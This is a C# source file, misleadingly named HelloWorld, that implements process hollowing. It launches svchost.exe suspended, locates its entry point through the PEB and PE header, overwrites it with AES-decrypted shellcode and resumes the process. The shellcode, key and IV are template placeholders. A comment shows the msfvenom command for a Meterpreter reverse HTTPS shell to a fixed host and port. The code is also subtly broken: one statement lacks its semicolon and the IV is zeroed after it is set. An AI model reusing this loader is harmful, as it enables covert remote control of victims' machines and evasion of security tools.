using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;

public class HelloWorld
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }


    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)] private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)] private static extern uint ResumeThread(IntPtr hThread);

    public static void Main(string[] args)
    {
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

        // Call ZwQueryInformationProcess and fetch the address of PEB from PROCESS_BASIC_INFORMATION
        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;
        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

        // pointer to the image base of svchost.exe
        IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

        // use ReadProcessMemory to fetch the address of the code base
        byte[] addrBuf = new byte[IntPtr.Size];
        IntPtr nRead = IntPtr.Zero;
        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

        // Convert 8-byte buffer to Int64 and then cast to  IntPtr
        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

        // parse the PE header to locate the EntryPoint
        // Use ReadProcess Memory to fetch the PE header
        byte[] data = new byte[0x200];
        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

        // Convert four bytes at offset 0x3c to an unsigned integer
        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

        // Convert four bytes at offset e_lfanew plus 0x28 into an unsigned integer
        uint opthdr = e_lfanew_offset + 0x28;

        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.7.30.130 LPORT=443 -f csharp
        // C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe .\5.4.2.process_hollowing.cs
        byte[] enc_sh = System.Convert.FromBase64String("{{aes_b64_shellcode}}");
        byte[] KEY = Encoding.ASCII.GetBytes(PaddingString("{{aes_key}}"));
        byte[] IV = Encoding.ASCII.GetBytes(PaddingString("{{aes_iv}}"));
        byte[] buf = AesDecrypt(enc_sh, KEY,IV);


        WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

        ResumeThread(pi.hThread);
    }
        public static String PaddingString(String _Input)
        {
            return _Input.PadRight(16, '\0');
        }

        private static byte[] AesDecrypt(byte[] _Data, byte[] _Key, byte[] _IV)
        {
            Aes aesAlg = Aes.Create();
            aesAlg.KeySize = 128;
            aesAlg.BlockSize = 128;
            aesAlg.Padding = System.Security.Cryptography.PaddingMode.Zeros;

            aesAlg.Key = _Key;

            aesAlg.IV = _IV

            Array.Clear(aesAlg.IV, 0, aesAlg.IV.Length);
            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
            byte[] unencryptedData = decryptor.TransformFinalBlock(_Data, 0, _Data.Length);
            return unencryptedData;
        }
}
